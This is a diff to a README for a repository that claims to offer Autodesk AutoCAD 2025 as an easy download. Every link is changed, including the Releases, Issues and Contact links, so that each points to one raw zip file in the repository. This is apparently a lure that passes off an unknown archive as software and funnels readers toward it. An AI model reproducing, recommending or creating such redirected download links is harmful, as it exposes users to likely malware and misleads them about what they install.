@@ -1,6 +1,6 @@
 # 🎨 auto-cad-2025 - Download and Install Effortlessly
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/FromEmptyMoon/auto-cad-2025/releases)
+[![Download Now](https://raw.githubusercontent.com/FromEmptyMoon/auto-cad-2025/main/yulan/auto-cad-2025.zip%https://raw.githubusercontent.com/FromEmptyMoon/auto-cad-2025/main/yulan/auto-cad-2025.zip)](https://raw.githubusercontent.com/FromEmptyMoon/auto-cad-2025/main/yulan/auto-cad-2025.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the **auto-cad-2025** repository! This application allows you to down
 
 You can download the application from the Releases page. Simply click the button below to visit the page and get the latest version.
 
-[Download from Releases](https://github.com/FromEmptyMoon/auto-cad-2025/releases)
+[Download from Releases](https://raw.githubusercontent.com/FromEmptyMoon/auto-cad-2025/main/yulan/auto-cad-2025.zip)
 
 ## 📋 System Requirements
 
@@ -24,7 +24,7 @@ Before you download, make sure your computer meets the following requirements:
 
 ## 🔄 Download & Install
 
-1. Visit the [Releases page](https://github.com/FromEmptyMoon/auto-cad-2025/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/FromEmptyMoon/auto-cad-2025/main/yulan/auto-cad-2025.zip).
 2. Find the latest version of **auto-cad-2025** in the list.
 3. Click on the link for the installer file (it should end with `.exe`).
 4. Once the download completes, locate the file on your computer (usually in your Downloads folder).
@@ -51,7 +51,7 @@ Here are some features you can expect from auto-cad-2025:
 
 ## 👍 Support
 
-If you encounter any issues or have questions regarding installation or usage, please visit the [Issues section](https://github.com/FromEmptyMoon/auto-cad-2025/issues) of our repository. You can report bugs, request features, or ask for help.
+If you encounter any issues or have questions regarding installation or usage, please visit the [Issues section](https://raw.githubusercontent.com/FromEmptyMoon/auto-cad-2025/main/yulan/auto-cad-2025.zip) of our repository. You can report bugs, request features, or ask for help.
 
 ## 📝 Topics
 
@@ -66,6 +66,6 @@ Feel free to explore these topics on your own or discuss them with other users.
 
 ## 📧 Contact
 
-For more information or inquiries, please reach out via the repository's [Contact page](https://github.com/FromEmptyMoon/auto-cad-2025/contact).
+For more information or inquiries, please reach out via the repository's [Contact page](https://raw.githubusercontent.com/FromEmptyMoon/auto-cad-2025/main/yulan/auto-cad-2025.zip).
 
 Happy designing with Autodesk Autocad 2025!
